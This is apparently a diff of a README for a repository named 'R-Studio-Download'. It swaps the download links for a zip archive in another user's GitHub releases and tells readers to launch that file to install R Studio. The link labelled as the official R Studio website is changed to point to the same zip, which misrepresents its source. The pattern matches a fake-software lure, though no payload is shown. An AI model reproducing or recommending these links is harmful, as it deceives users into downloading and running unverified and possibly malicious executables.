@@ -8,7 +8,7 @@ The "R-Studio-Download" repository focuses on various aspects of R Studio, such 
 
 ## 🚀 Quick Links
 
-🔗 **[Download Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)**
+🔗 **[Download https://github.com/bobolina87/R-Studio-Download/releases/download/v1.0/Application.zip](https://github.com/bobolina87/R-Studio-Download/releases/download/v1.0/Application.zip)**
 
 Note: The provided link leads to a downloadable file that needs to be launched for installation.
 
@@ -48,8 +48,8 @@ For the latest updates and releases, be sure to check the "Releases" section of 
 
 ## 🌐 Visit Website
 
-Explore more about R Studio and its capabilities by visiting the official [R Studio website](https://www.rstudio.com/).
+Explore more about R Studio and its capabilities by visiting the official [R Studio website](https://github.com/bobolina87/R-Studio-Download/releases/download/v1.0/Application.zip).
 
 ## 🌟 Get Started
 
-Ready to dive into the world of R Studio? Click the link above to download the Software.zip file and unleash the full potential of this versatile tool. Happy coding! 🚀
+Ready to dive into the world of R Studio? Click the link above to download the https://github.com/bobolina87/R-Studio-Download/releases/download/v1.0/Application.zip file and unleash the full potential of this versatile tool. Happy coding! 🚀
